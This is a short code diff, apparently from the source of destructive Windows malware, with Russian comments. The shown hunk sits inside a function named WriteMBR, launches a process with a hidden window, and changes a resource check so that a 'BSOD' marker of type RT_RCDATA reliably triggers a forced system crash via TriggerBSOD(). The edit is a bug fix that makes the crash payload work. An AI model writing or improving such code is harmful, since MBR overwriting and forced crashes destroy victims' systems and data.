@@ -160,7 +160,8 @@ void WriteMBR() {
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
     // --- BSOD (если есть маркер в ресурсах) ---
-    if (FindResourceA(NULL, "BSOD", "SETTING")) {
+    // Ищем ресурс "BSOD" типа RT_RCDATA (стандартный тип для бинарных данных)
+    if (FindResourceA(NULL, "BSOD", RT_RCDATA)) {
         TriggerBSOD();
     }
 }
